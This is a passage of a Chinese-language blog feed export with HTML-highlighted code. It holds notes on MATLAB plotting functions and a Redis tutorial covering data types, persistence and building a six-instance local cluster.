class="number">1</span>:<span class="number">6</span><span class="comment">;</span></span><br><span class="line">y = <span class="number">35</span>*rand(<span class="number">1</span>,<span class="number">6</span>)<span class="comment">;</span></span><br><span class="line"><span class="keyword">bar(x, </span>y)<span class="comment">;</span></span><br><span class="line">xlabel(<span class="string">"月份"</span>)<span class="comment">;</span></span><br><span class="line">ylabel(<span class="string">"平均温度(^&#123;o&#125;C)"</span>)<span class="comment">;</span></span><br><span class="line">set(gca, <span class="string">"xticklabel"</span>, &#123;<span class="string">"一月"</span>,<span class="string">"二月"</span>,<span class="string">"三月"</span>,<span class="string">"四月"</span>,<span class="string">"五月"</span>,<span class="string">"六月"</span>,&#125;)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="面积图的绘制area"><a href="#面积图的绘制area" class="headerlink" title="面积图的绘制area"></a>面积图的绘制area</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">y = rand(<span class="number">10</span>, <span class="number">3</span>)*<span class="number">100</span><span class="comment">; % rand(10, 3)表示随机生成3组10个0~1的数，即10x3的矩阵</span></span><br><span class="line">x = <span class="number">1</span>:<span class="number">10</span><span class="comment">;</span></span><br><span class="line">area(x, y)<span class="comment">;</span></span><br><span class="line">xlabel(<span class="string">"Year"</span>)<span class="comment">;</span></span><br><span class="line">ylabel(<span class="string">"Count"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="绘制扇形图pie"><a href="#绘制扇形图pie" class="headerlink" title="绘制扇形图pie"></a>绘制扇形图pie</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>]; % x中的元素大于<span class="number">1</span>会转化为比例来绘制，小于<span class="number">1</span>则根据对应的比例来绘制，不足<span class="number">1</span>的则空着</span><br><span class="line">label = &#123;<span class="string">"东"</span>,<span class="string">"南"</span>,<span class="string">"西"</span>,<span class="string">"北"</span>&#125;;</span><br><span class="line">explode = [<span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span>];</span><br><span class="line">colormap cool; % 也可设置其他颜色</span><br><span class="line">pie(x, label);</span><br><span class="line">pie3(x, label)</span><br></pre></td></tr></table></figure><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 使用以下方式将百分比和label同时显示</span></span><br><span class="line">clear,clc</span><br><span class="line">money=[<span class="number">5</span> <span class="number">10</span> <span class="number">7</span> <span class="number">15</span>];<span class="comment">%输入数据</span></span><br><span class="line">name=&#123;<span class="string">'George'</span>,<span class="string">'Sam'</span>,<span class="string">'Betty'</span>,<span class="string">'Charlie'</span>&#125;;<span class="comment">%输入标签</span></span><br><span class="line">explode=[<span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span>];<span class="comment">%定义突出的部分</span></span><br><span class="line">bili=money/sum(money);<span class="comment">%计算比例</span></span><br><span class="line">baifenbi=<span class="built_in">round</span>(bili*<span class="number">10000</span>)/<span class="number">100</span>;<span class="comment">%计算百分比</span></span><br><span class="line">baifenbi=num2str(baifenbi'); <span class="comment">%转化为字符型</span></span><br><span class="line">baifenbi=cellstr(baifenbi); <span class="comment">% 转化为字符串数组</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="built_in">length</span>(name) <span class="comment">%在每个姓名后加2个空格</span></span><br><span class="line">    name(<span class="built_in">i</span>)=&#123;[name&#123;<span class="built_in">i</span>&#125;,blanks(<span class="number">2</span>)]&#125;;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">bfh=cellstr(<span class="built_in">repmat</span>(<span class="string">'%'</span>,<span class="built_in">length</span>(money),<span class="number">1</span>));<span class="comment">%创建百分号字符串数组</span></span><br><span class="line">c=strcat(name,baifenbi',bfh');</span><br><span class="line">pie(money,explode,c)</span><br></pre></td></tr></table></figure><h2 id="针头图像stem"><a href="#针头图像stem" class="headerlink" title="针头图像stem"></a>针头图像stem</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">t</span> = <span class="symbol">0:0</span>.<span class="symbol">2:4</span>*<span class="built_in">pi</span>;</span><br><span class="line">y = <span class="built_in">cos</span>(<span class="built_in">t</span>).*<span class="built_in">exp</span>(-<span class="built_in">t</span>/<span class="number">5</span>);</span><br><span class="line">stem(<span class="built_in">t</span>,y);</span><br></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theta = -<span class="built-in">pi</span>:<span class="number">0.05</span>:<span class="built-in">pi</span>;</span><br><span class="line">x = <span class="built-in">cos</span>(theta);</span><br><span class="line">y = <span class="built-in">sin</span>(theta);</span><br><span class="line">z = <span class="built-in">abs</span>(<span class="built-in">cos</span>(<span class="number">3</span>*theta)).*<span class="built-in">exp</span>(-<span class="built-in">abs</span>(theta/<span class="number">3</span>));</span><br><span class="line">stem3(x, y, z);</span><br></pre></td></tr></table></figure><h2 id="阶梯图的绘制stairs"><a href="#阶梯图的绘制stairs" class="headerlink" title="阶梯图的绘制stairs"></a>阶梯图的绘制stairs</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">t</span> = <span class="symbol">0:0</span>.<span class="symbol">4:4</span>*<span class="built_in">pi</span>;</span><br><span class="line">y = <span class="built_in">cos</span>(<span class="built_in">t</span>).*<span class="built_in">exp</span>(-<span class="built_in">t</span>/<span class="number">5</span>);</span><br><span class="line">stairs(<span class="built_in">t</span>, y);</span><br></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">% 阶梯针头图如下</span><br><span class="line"><span class="built_in">t</span> = <span class="symbol">0:0</span>.<span class="symbol">4:4</span>*<span class="built_in">pi</span>;</span><br><span class="line">y = <span class="built_in">cos</span>(<span class="built_in">t</span>).*<span class="built_in">exp</span>(-<span class="built_in">t</span>/<span class="number">5</span>);</span><br><span class="line">stairs(<span class="built_in">t</span>,y);</span><br><span class="line">hold on</span><br><span class="line">stem(<span class="built_in">t</span>,y);</span><br><span class="line">hold off</span><br></pre></td></tr></table></figure><h2 id="绘制实心图"><a href="#绘制实心图" class="headerlink" title="绘制实心图"></a>绘制实心图</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">t</span> = <span class="symbol">0:0</span>.<span class="symbol">4:4</span>*<span class="built_in">pi</span>;</span><br><span class="line">y = <span class="built_in">sin</span>(<span class="built_in">t</span>).*<span class="built_in">exp</span>(-<span class="built_in">t</span>/<span class="number">5</span>);</span><br><span class="line">fill(<span class="built_in">t</span>, y, 'y');</span><br><span class="line">hold on</span><br><span class="line">stem(<span class="built_in">t</span>, y, 'b');</span><br><span class="line">hold off</span><br></pre></td></tr></table></figure><h2 id="三维绘图"><a href="#三维绘图" class="headerlink" title="三维绘图"></a>三维绘图</h2><p>一般使用两种方式：</p><ul><li>mesh: 可画出立体的网状图,即由多条曲线构成</li><li>surf：可画出立体的曲面图,即由多条曲面构成</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">0</span> <span class="number">2</span> <span class="number">1</span>;<span class="number">3</span> <span class="number">2</span> <span class="number">4</span>;<span class="number">4</span> <span class="number">4</span> <span class="number">4</span>;<span class="number">7</span> <span class="number">6</span> <span class="number">8</span>];</span><br><span class="line">mesh(x);</span><br><span class="line">% 这样绘制之后会出现一个网状图，端点有<span class="number">12</span>个，即举证的元素个数的值分别对应z轴，而x，y轴都是以<span class="number">1</span>位间距均等分的</span><br></pre></td></tr></table></figure><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = linspace(<span class="number">-2</span>, <span class="number">2</span>, <span class="number">50</span>);</span><br><span class="line">y = linspace(<span class="number">-2</span>, <span class="number">2</span>, <span class="number">50</span>);</span><br><span class="line">[xx, yy] = meshgrid(x, y);</span><br><span class="line">zz = xx.*exp(-xx.^<span class="number">2</span>-yy.^<span class="number">2</span>);</span><br><span class="line">mesh(xx, yy, zz);</span><br></pre></td></tr></table></figure><p>为了方便测试立体绘图，MATLAB提供了一个peaks函数，可产生一个凹凸有致的曲面，包含了三个局部极大点（Local Maxima）及三个局部极小点（Local Minima）<br>peaks函数的方程式如下</p><script type="math/tex; mode=display">Z=3(1-x)^2e^{-x-(y+1)^2}-10(\frac{x}{5}-x^3-y^5)e^{-x^2-y^2}-\frac{1}{3}e^{-(x+1)^2-y^2}</script><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">peaks<span class="comment">;  %直接产生上述三维函数图形</span></span><br><span class="line">colorbar<span class="comment">; % 显示颜色条</span></span><br><span class="line">colormap cool<span class="comment">; % 设置颜色，除了cool还有多种颜色（bone、spring、winter），需要时可以自己查看并设置</span></span><br><span class="line"><span class="keyword">shading </span>interp<span class="comment">; % 将立体图像设置成连续变化的</span></span><br><span class="line"><span class="keyword">shading </span>flat<span class="comment">; % 瓷砖的颜色是单一的</span></span><br><span class="line"><span class="keyword">shading </span>faceted<span class="comment">; 默认值</span></span><br></pre></td></tr></table></figure><p>合理运用colormap和shading有时可以产生出比较好的效果，例如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">surfl(peaks)<span class="comment">; % 曲面加上光源</span></span><br><span class="line">axis tight<span class="comment">;</span></span><br><span class="line">colormap pink<span class="comment">; % bone也不错</span></span><br><span class="line"><span class="keyword">shading </span>interp<span class="comment">;</span></span><br></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% 产生“瀑布”</span><br><span class="line">[x, y, z] = peaks<span class="comment">;</span></span><br><span class="line">meshz(x, y, z)<span class="comment">;</span></span><br><span class="line">axis tight<span class="comment">;</span></span><br></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">% 可在产生水流效果</span><br><span class="line">[x, y, z] = peaks<span class="comment">;</span></span><br><span class="line">waterfall(x, y, z)<span class="comment">;</span></span><br><span class="line">axis tight<span class="comment">;</span></span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%meshc</span>可同时画出网状圆形（等高线Contous）</span><br><span class="line">[<span class="keyword">x</span>, y, z] = peaks<span class="comment">;</span></span><br><span class="line"><span class="comment">meshc(x, y, z);</span></span><br><span class="line"><span class="comment">axis tight;</span></span><br></pre></td></tr></table></figure><ul><li>plot3绘图</li></ul><p>plot3指令可画出三度空间中的曲线</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">t</span> = linspace(<span class="number">0</span>, <span class="number">20</span>*<span class="built_in">pi</span>, <span class="number">501</span>);</span><br><span class="line">plot3(t.*<span class="built_in">sin</span>(<span class="built_in">t</span>), t.*<span class="built_in">cos</span>(<span class="built_in">t</span>), <span class="built_in">t</span>); % 画出tsin(<span class="built_in">t</span>)、tcos(<span class="built_in">t</span>)、<span class="built_in">t</span>的曲线</span><br></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[x, y] = meshgrid<span class="comment">(-2:0.1:2)</span>;</span><br><span class="line">z = y.*exp<span class="comment">(-x.^2-y.^2)</span>;</span><br><span class="line">plot<span class="number">3</span><span class="comment">(x, y, z)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 很复杂的一个立体图，有兴趣的也可以去找找其他的复杂图形</span></span><br><span class="line">volvec</span><br></pre></td></tr></table></figure><h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 下面介绍几种以有的一些动画</span></span><br><span class="line">lorenz</span><br><span class="line">truss</span><br><span class="line">travel</span><br><span class="line">fitdemo</span><br><span class="line"><span class="comment">% 以下需要Simlate</span></span><br><span class="line">onecart</span><br><span class="line">dblcart1</span><br><span class="line">simppend</span><br><span class="line">dblpend1</span><br><span class="line">dblpend2</span><br><span class="line">penddemo</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Matlab常见的绘图Api&quot;&gt;&lt;a href=&quot;#Matlab常见的绘图Api&quot; class=&quot;headerlink&quot; title=&quot;Matlab常见的绘图Api&quot;&gt;&lt;/a&gt;&lt;center&gt;Matlab常见的绘图Api&lt;/center&gt;&lt;/h1&gt;&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="笔记" scheme="https://muzimz.cn/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://muzimz.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>学习Redis的正确方式</title>
    <link href="https://muzimz.cn/2019/02/13/%E5%AD%A6%E4%B9%A0Redis%E7%9A%84%E6%AD%A3%E7%A1%AE%E6%96%B9%E5%BC%8F/"/>
    <id>https://muzimz.cn/2019/02/13/学习Redis的正确方式/</id>
    <published>2019-02-13T01:56:43.000Z</published>
    <updated>2020-02-21T02:53:34.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="学习Redis的正确方式"><a href="#学习Redis的正确方式" class="headerlink" title="学习Redis的正确方式"></a><center>学习Redis的正确方式</center></h1><h2 id="一、redis五种数据类型"><a href="#一、redis五种数据类型" class="headerlink" title="一、redis五种数据类型"></a>一、redis五种数据类型</h2><ul><li>String：key-value  </li></ul><p>redis命令不区分大小写，但是key区分的<br>redis中的数据都是字符串。<br>redis是单线程，（不适合存储比较大的数据）</p><p>使用incr  命令，如果key 不存在，会自动创建key 并自动+1.<br>redis中所有的数据都是字符串。</p> <figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">key</span> <span class="built_in">value</span> 设置值</span><br><span class="line"><span class="built_in">get</span> <span class="built_in">key</span> 获取值</span><br><span class="line">incr <span class="built_in">key</span> 加一</span><br><span class="line">decr <span class="built_in">key</span> 减一</span><br></pre></td></tr></table></figure><p> <img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=710172131,3044592445&fm=26&gp=0.jpg"></p><a id="more"></a><ul><li>Hash: key-field-value</li></ul><p>相当于一个key 对应一个map (map中又是key- value)，<br>    应用于归类<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hset  <span class="built_in">key</span> field value  设置值</span><br><span class="line">    hget  <span class="built_in">key</span> field       获取值</span><br><span class="line">    hincrby <span class="built_in">key</span> field <span class="built_in">num</span>  设置增数量</span><br></pre></td></tr></table></figure></p><ul><li>List</li></ul><p>List是有顺序可重复(数据结构中的：双链表，队列)<br>    可作为链表 ，从左添加元素  也可以从右添加元素。<br><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lpush <span class="keyword">list</span> a b c d    (从左添加元素)</span><br><span class="line">rpush <span class="keyword">list</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>    (从右边添加元素)</span><br><span class="line"><span class="keyword">lrange</span> <span class="keyword">list</span> <span class="number">0</span> <span class="number">-1</span> (从<span class="number">0</span> 到 <span class="number">-1</span> 元素查看：也就表示查看所有)</span><br><span class="line">lpop <span class="keyword">list</span> （从左边取，删除）</span><br><span class="line">rpop <span class="keyword">list</span>  (从右边取，删除)</span><br></pre></td></tr></table></figure></p><ul><li><p>set</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set无顺序，不能重复</span><br><span class="line">sadd set1 <span class="selector-tag">a</span> <span class="selector-tag">b</span> c d d (向set1中添加元素) 元素不重复</span><br><span class="line">smembers set1 （查询元素）</span><br><span class="line">srem set1 <span class="selector-tag">a</span> （删除元素）</span><br></pre></td></tr></table></figure></li><li><p>sortedset（zset）</p></li></ul><p>有顺序，不能重复<br>    适合做排行榜 排序需要一个分数属性<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zadd zset1 <span class="number">9</span> a <span class="number">8</span> c <span class="number">10</span> d <span class="number">1</span> e   （添加元素 zadd <span class="type">key</span> score member ）</span><br><span class="line">(ZRANGE <span class="type">key</span> start stop [WITHSCORES])(查看所有元素：zrange <span class="type">key</span>  <span class="number">0</span>  <span class="number">-1</span>  withscores)</span><br></pre></td></tr></table></figure></p><p>如果要查看分数，加上withscores.<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">zrange zset1 <span class="number">0</span> -<span class="number">1</span> (从小到大)</span><br><span class="line"></span><br><span class="line">zrevrange zset1 <span class="number">0</span> -<span class="number">1</span> (从大到小)</span><br><span class="line"></span><br><span class="line">zincrby zset2 score member (对元素member 增加 score)</span><br><span class="line"></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zadd zset1 <span class="number">8</span> a <span class="number">4</span> b <span class="number">5</span> c <span class="number">1</span> d</span><br><span class="line">(integer) <span class="number">4</span></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zrange zset1 <span class="number">0</span> -<span class="number">1</span> </span><br><span class="line"><span class="number">1</span>) <span class="string">"d"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"b"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"c"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"a"</span></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zadd zset1 <span class="number">9</span> a</span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zrange zset1 <span class="number">0</span> -<span class="number">1</span> </span><br><span class="line"><span class="number">1</span>) <span class="string">"d"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"b"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"c"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"a"</span></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zrange zset1 <span class="number">0</span> -<span class="number">1</span> withscores</span><br><span class="line"><span class="number">1</span>) <span class="string">"d"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"1"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"b"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"4"</span></span><br><span class="line"><span class="number">5</span>) <span class="string">"c"</span></span><br><span class="line"><span class="number">6</span>) <span class="string">"5"</span></span><br><span class="line"><span class="number">7</span>) <span class="string">"a"</span></span><br><span class="line"><span class="number">8</span>) <span class="string">"9"</span></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zrevrange zset1 <span class="number">0</span> -<span class="number">1</span></span><br><span class="line"><span class="number">1</span>) <span class="string">"a"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"c"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"b"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"d"</span></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zincrby zset1 <span class="number">1</span> a</span><br><span class="line"><span class="string">"10"</span></span><br><span class="line"><span class="meta">127.0.0.1:6379&gt;</span> zrevrange zset1 <span class="number">0</span> -<span class="number">1</span> withscores</span><br><span class="line"><span class="number">1</span>) <span class="string">"a"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"10"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"c"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"5"</span></span><br><span class="line"><span class="number">5</span>) <span class="string">"b"</span></span><br><span class="line"><span class="number">6</span>) <span class="string">"4"</span></span><br><span class="line"><span class="number">7</span>) <span class="string">"d"</span></span><br><span class="line"><span class="number">8</span>) <span class="string">"1"</span></span><br></pre></td></tr></table></figure></p><h2 id="二、redis持久化方案"><a href="#二、redis持久化方案" class="headerlink" title="二、redis持久化方案"></a>二、redis持久化方案</h2><p>Redis 数据都放在内存中。如果机器挂掉，内存的数据就不存在。<br>需要做持久化，讲内存中的数据保存在磁盘，下一次启动的时候就可以恢复数据到内存中。</p><ul><li><p>RDB   快照形式  （定期将当前时刻的数据保存磁盘中）会产生一个dump.rdb文件<br>特点：会存在数据丢失，性能较好，数据备份。</p></li><li><p>AOF   append only file  (所有对redis的操作命令记录在aof文件中)，恢复数据，重新执行一遍即可。</p><pre><code>  特点：每秒保存，数据比较完整，耗费性能。    </code></pre></li></ul><p>redis 默认开启RDB</p><h2 id="三、redis集群的搭建"><a href="#三、redis集群的搭建" class="headerlink" title="三、redis集群的搭建"></a>三、redis集群的搭建</h2><p>架构细节:<br>(1)所有的redis节点彼此互联(PING-PONG机制),内部使用二进制协议优化传输速度和带宽.<br>(2)节点的fail是通过集群中超过半数的节点检测失效时才生效.通过投票机制<br>(3)客户端与redis节点直连,不需要中间proxy层.客户端不需要连接集群所有节点,连接集群中任何一个可用节点即可<br>(4)redis-cluster把所有的物理节点映射到[0-16383]slot上,cluster 负责维护</p><blockquote><p>redis集群中内置了16384个哈希槽，当需要在Redis集群中放置一个Key-value时，redis先对key使用crc16算法算出一个结果，然后把结果对16384求余数，这样每个key都会对应一个编号在0-16383之间的哈希槽，redis会根据节点数量大致均等的将哈希槽映射道不同的节点。</p></blockquote><p>至少3个节点，为了集群的高可用，为每一个节点增加一个备份机。（6台服务器）。</p><p>搭建伪分布式集群方案：在一台机器里面运行6个redis实例。端口需要不同（7001-7006）</p><h2 id="3-1-准备阶段"><a href="#3-1-准备阶段" class="headerlink" title="3.1 准备阶段"></a>3.1 准备阶段</h2><p>redis-3.2.1.gem<br>redis-trib.rb</p><h2 id="3-2-集群搭建"><a href="#3-2-集群搭建" class="headerlink" title="3.2 集群搭建"></a>3.2 集群搭建</h2><p>进入到local并创建一个redis-cluster:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span></span><br><span class="line"><span class="keyword">mkdir</span> redis-<span class="keyword">cluster</span></span><br></pre></td></tr></table></figure></p><p>将local下的redis复制到redis-cluster文件夹中并命名为redis01<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp redis /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis01 -<span class="built_in">r</span></span><br></pre></td></tr></table></figure></p><p>使用vim修改redis.conf配置文件<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> redis01/bin</span><br><span class="line"><span class="keyword">vim</span> redis.<span class="keyword">conf</span></span><br><span class="line"># <span class="keyword">vim</span>在可读状态下可使用/+名来进行查找</span><br><span class="line">主要修改如下两个地方：</span><br><span class="line"><span class="number">1</span>. 将cluster-enabled : yes的注释去掉</span><br><span class="line"><span class="number">2</span>. 将端口port <span class="number">6379</span> 修改为<span class="number">7001</span></span><br><span class="line">esc -&gt; shift+: -&gt; <span class="keyword">wq</span> 保存并退出</span><br></pre></td></tr></table></figure></p><p>再复制五份redis01到redis-cluster中，并命名为02 03 04 05 06</p><p>依次将以上五份redis的redis.conf文件中的端口port设置为7002 7003 7004 7005 7006，保存并退出</p><p>以上配置完成之后，我们需要启动以上六个redis，为了方便，我们在redis-cluster文件夹中创建一个redis_start_all.sh文件，并编辑如下：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis_start_all.<span class="keyword">sh</span></span><br><span class="line">编辑如下内容：</span><br><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis01/bin</span><br><span class="line">./redis-server redis.<span class="keyword">conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis02/bin</span><br><span class="line">./redis-server redis.<span class="keyword">conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis03/bin</span><br><span class="line">./redis-server redis.<span class="keyword">conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis04/bin</span><br><span class="line">./redis-server redis.<span class="keyword">conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis05/bin</span><br><span class="line">./redis-server redis.<span class="keyword">conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span>/redis-<span class="keyword">cluster</span>/redis06/bin</span><br><span class="line">./redis-server redis.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure></p><p>编辑完成之后，我们需要将redis_start_all.sh文件配置成可执行，执行以下命令，然后启动六份redis：<br><figure class="highlight 